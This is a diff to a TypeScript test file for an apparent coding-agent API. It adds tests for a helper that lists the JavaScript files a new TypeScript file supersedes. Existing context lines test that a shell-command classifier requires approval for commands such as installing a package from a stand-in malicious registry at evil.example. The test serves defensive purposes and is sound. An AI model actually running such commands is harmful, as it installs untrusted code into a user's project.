@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vitest";
+import { supersededSources } from "../apps/agent-api/src/code-tool-superseded-source";
 import { ActiveContextResolver } from "../apps/agent-api/src/active-context-resolver";
 import { parseCodeSearchOutput } from "../apps/agent-api/src/code-search-output";
 import { classifyShellCommand } from "../apps/agent-api/src/code-shell-classifier";
@@ -54,6 +55,17 @@ describe("everyday package commands", () => {
 
   it.each(["npm run deploy", "npm run migrate", "npm run release", "npm view https://evil.example/x", "npm install -D vite --registry=https://evil.example"])("keeps %s behind approval", (command) => {
     expect(classifyTerminalCommand(command).requiresApproval).toBe(true);
+  });
+});
+
+describe("a new TypeScript file replaces its JavaScript twin", () => {
+  it("names the twins of a source file only", () => {
+    expect(supersededSources("src/App.tsx")).toEqual(["src/App.jsx", "src/App.js"]);
+    expect(supersededSources("src/tasks.ts")).toEqual(["src/tasks.jsx", "src/tasks.js"]);
+    expect(supersededSources("src/env.d.ts")).toEqual([]);
+    expect(supersededSources("vite.config.ts")).toEqual([]);
+    expect(supersededSources("src/App.test.tsx")).toEqual([]);
+    expect(supersededSources("src/App.jsx")).toEqual([]);
   });
 });
 
